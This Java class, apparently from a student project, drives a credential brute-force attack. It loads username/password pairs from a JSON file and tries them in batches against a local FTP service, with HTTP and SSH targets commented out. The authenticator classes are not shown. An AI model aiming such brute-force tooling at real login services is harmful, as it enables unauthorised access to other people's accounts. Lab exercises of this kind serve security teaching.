package org.ops;

import java.util.List;

public class BruteForceController {

    private static final String JSON_PATH = "C:\\Users\\mario\\OneDrive\\Documentos\\CETI\\5to\\Arquitectura\\BruteForce\\src\\main\\resources\\credentials.json";

    public static void main(String[] args) throws Exception {
        System.out.println("Iniciando ataque...");

        List<Credential> credentials = BruteForceRunner.loadCredentialsFromFile(JSON_PATH);

        CredentialAuthenticator authenticator;

        //authenticator = new HttpAuthenticator("localhost", 8080, "/");

        authenticator = new FtpAuthenticator("localhost", 2121);

        //authenticator = new SshAuthenticator("localhost", 2222);

        BruteForceRunner.runInBatches(authenticator, credentials);

        if (!BruteForceRunner.isFound()) {
            System.out.println("❌ No se encontró ninguna combinación válida.");
        } else {
            System.out.println("Ataque completado con éxito.");
        }
    }
}